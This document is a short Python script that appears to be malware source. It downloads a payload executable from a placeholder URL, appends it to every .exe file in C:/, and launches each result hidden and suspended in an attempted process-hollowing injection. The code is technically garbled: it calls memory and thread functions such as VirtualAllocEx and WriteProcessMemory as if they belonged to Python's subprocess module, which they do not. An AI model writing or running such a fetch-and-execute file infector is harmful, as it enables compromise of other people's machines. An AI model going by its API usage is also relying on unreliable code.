import os
import sys
import subprocess
import tempfile
import requests

# Hardcoded save directory for the payload URL
payload_save_dir = "C:/path/to/save/directory/"

# Specify the URL of the payload executable
payload_url = "https://example.com/payload.exe"

# Download the payload executable from the specified URL
response = requests.get(payload_url)
payload_data = response.content

# Save the payload executable to the specified directory
payload_filename = payload_url.split("/")[-1]
payload_file_path = os.path.join(payload_save_dir, payload_filename)
with open(payload_file_path, "wb") as payload_file:
    payload_file.write(payload_data)

# Specify the directory to search for EXE files
target_directory = "C:/"

# Create a temporary file to hold the combined payload
combined_payload_path = tempfile.gettempdir() + "\\combined_payload.exe"

# Iterate over all files in the target directory
for filename in os.listdir(target_directory):
    file_path = os.path.join(target_directory, filename)

    # Check if the file is an EXE
    if os.path.isfile(file_path) and filename.lower().endswith(".exe"):
        
        # Read the current EXE file
        with open(file_path, "rb") as exe_file:
            exe_data = exe_file.read()
        
        # Create the combined payload by appending the payload data to the current EXE data
        combined_data = exe_data + payload_data
        
        # Write the combined payload to the temporary file
        with open(combined_payload_path, "wb") as combined_payload_file:
            combined_payload_file.write(combined_data)
        
        # Launch the combined payload using process hollowing
        startup_info = subprocess.STARTUPINFO()
        startup_info.dwFlags = subprocess.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = subprocess.SW_HIDE
        
        # Create the target process in a suspended state
        creation_flags = subprocess.CREATE_SUSPENDED | subprocess.CREATE_NEW_CONSOLE
        target_process = subprocess.Popen(combined_payload_path, startupinfo=startup_info, creationflags=creation_flags)
        
        # Allocate memory in the target process for the combined payload
        process_handle = target_process._handle
        process_information = subprocess.STARTUPINFO()
        process_information.dwFlags = subprocess.STARTF_USESTDHANDLES
        process_information.hStdInput = subprocess.GetCurrentProcess()
        process_information.hStdOutput = subprocess.GetCurrentProcess()
        process_information.hStdError = subprocess.GetCurrentProcess()
        image_base_address = subprocess.VirtualAllocEx(process_handle, 0, len(combined_data), subprocess.MEM_COMMIT | subprocess.MEM_RESERVE, subprocess.PAGE_EXECUTE_READWRITE)
        
        # Write the combined payload to the allocated memory
        subprocess.WriteProcessMemory(process_handle, image_base_address, combined_data, len(combined_data), None)
        
        # Update the process context with the new entry point and image base address
        process_context = subprocess.GetThreadContext(target_process._handle)
        process_context.Eax = image_base_address + len(exe_data) + 0x40  # Offset of the payload entry point
        subprocess.SetThreadContext(target_process._handle, process_context)
        
        # Resume the target process with the updated context
        subprocess.ResumeThread(target_process._handle)